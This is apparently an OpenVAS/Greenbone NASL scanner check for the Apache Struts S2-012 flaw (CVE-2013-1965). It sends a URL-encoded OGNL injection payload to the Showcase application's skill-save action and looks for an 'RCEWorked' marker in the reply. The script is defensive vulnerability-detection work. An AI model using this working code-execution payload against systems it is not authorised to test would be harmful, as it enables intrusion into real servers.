CPE = "cpe:/a:apache:struts";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902924" );
	script_version( "2021-09-15T09:21:17+0000" );
	script_bugtraq_id( 55165 );
	script_cve_id( "CVE-2013-1965" );
	script_tag( name: "cvss_base", value: "9.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2021-09-15 09:21:17 +0000 (Wed, 15 Sep 2021)" );
	script_tag( name: "creation_date", value: "2012-08-31 11:47:31 +0530 (Fri, 31 Aug 2012)" );
	script_name( "Apache Struts Security Update (S2-012) - Active Check" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_apache_struts_consolidation.sc" );
	script_require_ports( "Services/www", 8080 );
	script_mandatory_keys( "apache/struts/http/detected" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/523956" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/115770/struts2-exec.txt" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/apache-struts2-remote-code-execution" );
	script_xref( name: "URL", value: "https://cwiki.apache.org/confluence/display/WW/S2-012" );
	script_xref( name: "Advisory-ID", value: "S2-012" );
	script_xref( name: "URL", value: "https://cwiki.apache.org/confluence/display/WW/S2-058" );
	script_xref( name: "Advisory-ID", value: "S2-058" );
	script_tag( name: "summary", value: "Apache Struts is prone to a java method execution
  vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP POST request and checks the response." );
	script_tag( name: "insight", value: "The flaw is due to an improper validation of user data passed to
  the 'skillName' parameter in 'edit' and 'save' actions." );
	script_tag( name: "impact", value: "Successful exploitation could allow an attacker to execute
  arbitrary java method. Further that results to disclose environment variables or cause a denial of
  service or an arbitrary OS command can be executed." );
	script_tag( name: "affected", value: "Apache Struts (Showcase) 2.3.14.2 and prior." );
	script_tag( name: "solution", value: "Update to version 2.3.14.3 or later." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
dir += "/struts2-showcase";
useragent = http_get_user_agent();
host = http_host_name( port: port );
url = dir + "/showcase.action";
if(!http_vuln_check( port: port, url: url, pattern: ">Showcase</", extra_check: ">Struts Showcase<", check_header: TRUE, usecache: TRUE )){
	exit( 0 );
}
postdata = "currentSkill.name=%25%7B%28%23_memberAccess%5B%27allowStatic" + "MethodAccess%27%5D%3Dtrue%29%28%23context%5B%27xwork.MethodA" + "ccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23tmp%3D%40o" + "rg.apache.struts2.ServletActionContext%40getResponse%28%29.g" + "etWriter%28%29%2C%23tmp.println%28%27RCEWorked%27%29%2C%23tm" + "p.close%28%29%29%7D&currentSkill.description=";
url = dir + "/skill/save.action";
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
res = http_keepalive_send_recv( port: port, data: req );
if(res && IsMatchRegexp( res, "^HTTP/1\\.[0-9] 200" ) && ContainsString( res, "RCEWorked" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

